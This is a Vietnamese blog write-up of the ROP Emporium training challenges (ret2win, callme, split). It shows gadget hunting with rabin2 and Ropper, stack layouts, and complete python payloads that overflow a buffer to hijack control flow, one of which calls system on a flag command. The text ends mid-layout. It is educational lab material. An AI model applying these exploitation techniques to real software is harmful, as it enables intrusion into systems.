<!DOCTYPE html>
<html lang="vi">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="./theme/css/elegant.prod.9e9d5ce754.css" media="screen">
        <link rel="stylesheet" type="text/css" href="./theme/css/custom.css" media="screen">

        <link rel="dns-prefetch" href="//fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>

        <meta name="author" content="minix" />

        <meta property="og:type" content="article" />
        <meta name="twitter:card" content="summary">

<meta name="keywords" content="binary, exploit, rop, x64, Trang chủ, " />

<meta property="og:title" content="Học khai thác lỗ hổng bảo mật qua ROP Emporium "/>
<meta property="og:url" content="./pwn.html" />
<meta property="og:description" content="ROP Emporium ROP Emporium là chuỗi challenge dùng để hướng dẫn cách xây dựng exploit (ROP gadget bypass NX - NonExecute) dành cho newbie, cụ thể là tự build rop gadgets. Trước khi bắt đầu cần lưu ý một số thứ: Lab được sử dụng ở đây là x64_86, với các …" />
<meta property="og:site_name" content="FAMILUG.org Vietnam" />
<meta property="og:article:author" content="minix" />
<meta property="og:article:published_time" content="2023-09-29T00:00:00+07:00" />
<meta name="twitter:title" content="Học khai thác lỗ hổng bảo mật qua ROP Emporium ">
<meta name="twitter:description" content="ROP Emporium ROP Emporium là chuỗi challenge dùng để hướng dẫn cách xây dựng exploit (ROP gadget bypass NX - NonExecute) dành cho newbie, cụ thể là tự build rop gadgets. Trước khi bắt đầu cần lưu ý một số thứ: Lab được sử dụng ở đây là x64_86, với các …">

        <title>Học khai thác lỗ hổng bảo mật qua ROP Emporium  · FAMILUG.org Vietnam
</title>



    </head>
    <body>
        <div id="content">
            <div class="navbar navbar-static-top">
                <div class="navbar-inner">
                    <div class="container-fluid">
                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </a>
                        <a class="brand" href="./"><span class=site-name>FAMILUG.org Vietnam</span></a>
                        <div class="nav-collapse collapse">
                            <ul class="nav pull-right top-menu">
                                <li >
                                    <a href=
                                       .
                                    >Home</a>
                                </li>
                                <li ><a href="./categories.html">Categories</a></li>
                                <li ><a href="./tags.html">Tags</a></li>
                                <li ><a href="./archives.html">Archives</a></li>
                                <li><form class="navbar-search" action="./search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container-fluid">
                <div class="row-fluid">
                    <div class="span1"></div>
                    <div class="span10">
<article itemscope>
<div class="row-fluid">
    <header class="page-header span10 offset2">
        <h1>
            <a href="./pwn.html">
                Học khai thác lỗ hổng bảo mật qua ROP Emporium
            </a>
        </h1>
    </header>
</div>

<div class="row-fluid">
        <div class="span8 offset2 article-content">
            
            <h1>ROP Emporium</h1>
<p><a href="https://ropemporium.com/">ROP Emporium</a> là chuỗi challenge dùng để hướng dẫn cách xây dựng exploit (ROP gadget bypass NX - NonExecute) dành cho newbie, cụ thể là tự build rop gadgets. </p>
<p>Trước khi bắt đầu cần lưu ý một số thứ: </p>
<ul>
<li>Lab được sử dụng ở đây là x64_86, với các kiến trúc khác việc xây dựng rop gadget sẽ khác nhau</li>
<li>Số lượng offset cần để smashstack và ghi đè địa trỉ trở về trong binary x86 là 40, do đó ta sẽ thêm 40 bytes “A” để ghi đè địa chỉ trả về.</li>
<li>Lab cần vô hiệu hóa ASLR, ASLR sẽ khiến cho địa chỉ của binary trong bộ nhớ được phân bổ ngẫu nhiên khiến các địa chỉ trong gadget không chính xác (Cần lỗ hổng để leak base address và cộng thêm vào)</li>
<li>Công cụ sử dụng chủ yếu gồm: Ghidra (RE), rabin2, radare2, Ropper, pwndbg.</li>
<li>Cấu trúc stack sẽ biễu diễn từ thấp đến cao</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="err">[]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">thấp</span><span class="w"></span>
<span class="p">....</span><span class="w"></span>
<span class="err">[]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">cao</span><span class="w"></span>

<span class="n">push</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">thêm</span><span class="w"> </span><span class="n">giá</span><span class="w"> </span><span class="n">trị</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="n">và</span><span class="w"> </span><span class="n">thanh</span><span class="w"> </span><span class="n">ghi</span><span class="w"> </span><span class="n">rsp</span><span class="w"> </span><span class="p">(</span><span class="n">stack</span><span class="w"> </span><span class="n">pointer</span><span class="p">)</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">giảm</span><span class="w"></span>
<span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">lấy</span><span class="w"> </span><span class="n">giá</span><span class="w"> </span><span class="n">trị</span><span class="w"> </span><span class="n">tại</span><span class="w"> </span><span class="n">đỉnh</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="n">nơi</span><span class="w"> </span><span class="n">rsp</span><span class="w"> </span><span class="n">trỏ</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="n">và</span><span class="w"> </span><span class="n">giá</span><span class="w"> </span><span class="n">trị</span><span class="w"> </span><span class="n">rsp</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">tăng</span><span class="w"></span>
<span class="n">mov</span><span class="w"> </span><span class="o">[</span><span class="n">rsi</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">lấy</span><span class="w"> </span><span class="n">giá</span><span class="w"> </span><span class="n">trị</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="n">lưu</span><span class="w"> </span><span class="n">vào</span><span class="w"> </span><span class="n">tại</span><span class="w"> </span><span class="n">địa</span><span class="w"> </span><span class="n">chỉ</span><span class="w"> </span><span class="n">bộ</span><span class="w"> </span><span class="n">nhớ</span><span class="w"> </span><span class="n">lưu</span><span class="w"> </span><span class="n">trong</span><span class="w"> </span><span class="n">thanh</span><span class="w"> </span><span class="n">ghi</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="p">(</span><span class="n">địa</span><span class="w"> </span><span class="n">chỉ</span><span class="w"> </span><span class="n">sẽ</span><span class="w"> </span><span class="n">dùng</span><span class="w"> </span><span class="o">[</span><span class="n">rsi</span><span class="o">]</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<ul>
<li>Khi xây dựng rop gadget riêng với kiến trúc x64 sẽ gặp lỗi segfault dù rằng gadget chain vẫn đúng, điều này là do stack alignment của thư viện glibc (bị tại movaps). Do đó trước khi gặp địa chỉ trả về cần phải align stack trước bằng gadget <code>ret;</code> <a href="https://ropemporium.com/guide.html#Common%20pitfalls">https://ropemporium.com/guide.html#Common%20pitfalls</a></li>
<li>Calling convention x64 khác x86. x64 sẽ lấy argument tại các thanh ghi rdi → arg1, rsi→ arg2, rdx→arg3…., xem tại đây: <a href="http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html">http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html</a></li>
<li>Khi kết thúc một routine (function) hay callee (hàm được gọi) thì sẽ gặp instruction ret, lúc này stack pointer sẽ tăng lên và lấy giá trị trở về tại đỉnh stack chính là hàm caller (hàm gọi), do đó khi ta ghi đè giá trị này thì sẽ kiểm soát được luồng chương trình theo ý muốn.</li>
</ul>
<h2>Ret2win</h2>
<p>Challenge 1 khá đơn giản khi đã có function ret2win nhiệm vụ chỉ cần trả về địa chỉ của function đó là được</p>
<p><img alt="" src="./images/ropemporium/Ret2win/image.png"></p>
<p>Tiến hành lấy các gadget cần thiết</p>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">ret2win</span><span class="w"></span>
<span class="o">[</span><span class="n">Symbols</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">      </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="k">size</span><span class="w"> </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">36</span><span class="w">  </span><span class="mh">0x00000756</span><span class="w"> </span><span class="mh">0x00400756</span><span class="w"> </span><span class="k">LOCAL</span><span class="w">  </span><span class="n">FUNC</span><span class="w">   </span><span class="mi">27</span><span class="w">       </span><span class="n">ret2win</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>

<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">ret2win</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mh">0x000000000040053e</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
</code></pre></div>

<p>Ta sẽ build stack như sau:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"></span>
<span class="w">  </span><span class="p">[.....]</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">40</span><span class="o">*</span><span class="n">A</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x40053e</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x400756</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret2win</span><span class="p">();</span><span class="w"></span>
</code></pre></div>

<p>Truyền payload vào binary</p>
<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;A&#39;*40 + b&#39;</span><span class="se">\x3e\x05\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4  + b&#39;</span><span class="se">\x56\x07\x40\x00</span><span class="s2">&#39; + b&#39;</span><span class="se">\x00</span><span class="s2">&#39;*4)&quot;</span> <span class="o">|</span> <span class="o">./</span><span class="n">ret2win</span>
</code></pre></div>

<h2>Callme</h2>
<p>Challenge 3 sẽ hướng dẫn gọi 3 hàm liên tiếp theo thứ tự, chỉ cần gọi đúng thứ tự thì sẽ in ra flag</p>
<p>Reverse bằng Ghidra ta sẽ thấy 3 hàm lần lượt là callme_one, callme_two, callme_three</p>
<p><img alt="" src="./images/ropemporium/Callme/image.png"></p>
<p>Mỗi hàm cần truyền vào 3 tham số arg1, arg2 và arg3 lần lượt là 0xdeadbeef, 0xcafebabe và 0xd00df00d để có thể gọi hàm kế tiếp</p>
<p><img alt="" src="./images/ropemporium/Callme/1_image.png"></p>
<p>3 hàm này sử dụng lazy binding để thay đổi địa chỉ trong GOT và sẽ gọi đến địa chỉ hàm trong libcallme.so, tuy nhiên ta chỉ cần gọi địa chỉ của hàm trong binary là được. Tiến hành lấy các gadget cần thiết</p>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">callme</span><span class="w"></span>
<span class="o">[</span><span class="n">Imports</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">3</span><span class="w">   </span><span class="mh">0x004006f0</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">callme_three</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">7</span><span class="w">   </span><span class="mh">0x00400720</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">callme_one</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">10</span><span class="w">  </span><span class="mh">0x00400740</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">callme_two</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>

<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">callme</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mh">0x000000000040093c</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> </span>
<span class="mh">0x00000000004006be</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
</code></pre></div>

<p>Sử dụng gadget <code>pop rdi; pop rsi; pop rdx; ret;</code> sẽ lấy lần lượt 3 vị trí kế tiếp trong stack làm argument cho hàm trả về của chúng ta</p>
<p>Ta sẽ build stack như sau:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"></span>
<span class="w">  </span><span class="p">[.....]</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">40</span><span class="o">*</span><span class="n">A</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x40093c</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xdeadbeef</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg1</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xcafebabe</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg2</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xd00df00d</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg3</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x4006be</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x400720</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">callme_one</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x40093c</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xdeadbeef</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg1</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xcafebabe</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg2</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xd00df00d</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg3</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x4006be</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x400740</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">callme_two</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x40093c</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdx</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xdeadbeef</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg1</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xcafebabe</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg2</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0xd00df00d</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">rdx</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">arg3</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x4006be</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x4006f0</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">callme_three</span><span class="p">();</span><span class="w"></span>
</code></pre></div>

<p>Truyền payload vào binary</p>
<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="err">“</span><span class="kn">import</span> <span class="nn">sys</span><span class="p">;</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x3c\x09\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\xba\xfe\xca</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0d\xf0\x0d\xd0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\x06\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x20\x07\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x3c\x09\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\xba\xfe\xca</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0d\xf0\x0d\xd0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\x06\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x40\x07\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x3c\x09\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\xba\xfe\xca</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0d\xf0\x0d\xd0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xbe\x06\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf0\x06\x40\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="err">”</span> <span class="o">|</span> <span class="o">./</span><span class="n">callme</span>
</code></pre></div>

<h2>Split</h2>
<p>Challenge 2 hướng dẫn chúng ta truyền string có sẵn trong binary làm argument cho function cho chúng ta sử dụn</p>
<p><img alt="" src="./images/ropemporium/Split/image.png"></p>
<p>Ta thấy hàm system gọi <code>/bin/ls</code> tuy nhiên ở đây ta muốn lấy nội dung của flag nên ta sẽ lấy chuỗi <code>/bin/cat flag.txt</code> trong section .data của binary để truyền vào arg1 của function system(). Tiến hành lấy các gadget cần thiết</p>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">split</span><span class="w"></span>
<span class="o">[</span><span class="n">Imports</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">vaddr</span><span class="w">      </span><span class="n">bind</span><span class="w">   </span><span class="n">type</span><span class="w">   </span><span class="n">lib</span><span class="w"> </span><span class="n">name</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="mi">1</span><span class="w">   </span><span class="mh">0x00400550</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="n">puts</span><span class="w"></span>
<span class="mi">2</span><span class="w">   </span><span class="mh">0x00400560</span><span class="w"> </span><span class="k">GLOBAL</span><span class="w"> </span><span class="n">FUNC</span><span class="w">       </span><span class="k">system</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="err">$</span><span class="w"> </span><span class="n">rabin2</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="n">split</span><span class="w"></span>
<span class="o">[</span><span class="n">Strings</span><span class="o">]</span><span class="w"></span>
<span class="n">nth</span><span class="w"> </span><span class="n">paddr</span><span class="w">      </span><span class="n">vaddr</span><span class="w">      </span><span class="nf">len</span><span class="w"> </span><span class="k">size</span><span class="w"> </span><span class="k">section</span><span class="w"> </span><span class="n">type</span><span class="w">  </span><span class="n">string</span><span class="w"></span>
<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mi">0</span><span class="w">   </span><span class="mh">0x00001060</span><span class="w"> </span><span class="mh">0x00601060</span><span class="w"> </span><span class="mi">17</span><span class="w">  </span><span class="mi">18</span><span class="w">   </span><span class="p">.</span><span class="k">data</span><span class="w">   </span><span class="nf">ascii</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>


<span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">Ropper</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">split</span><span class="w"></span>
<span class="p">...</span><span class="w"></span>
<span class="mh">0x00000000004007c3</span><span class="err">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="mh">0x000000000040053e</span><span class="err">:</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
</code></pre></div>

<p>Gadget <code>pop rdi; ret;</code> sẽ lấy vị trí kế tiếp trong stack (địa chỉ của chuỗi command in ra flag trong section .data của binary) làm argument cho hàm system</p>
<p>Ta sẽ build stack như sau:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"></span>
<span class="w">  </span><span class="p">[.....]</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="o">*</span><span class="mi">8</span><span class="w">  </span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">40</span><span class="o">*</span><span class="n">A</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x4007c3</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x601060</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">.</span><span class="kt">data</span><span class="w">   </span><span class="kt">ascii</span><span class="w"> </span><span class="s">&quot;/bin/cat flag.txt&quot;</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">arg1</span><span class="w"></span>
<span class="w">  </span><span class="p">[</span><span class="mh">0x40053e</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
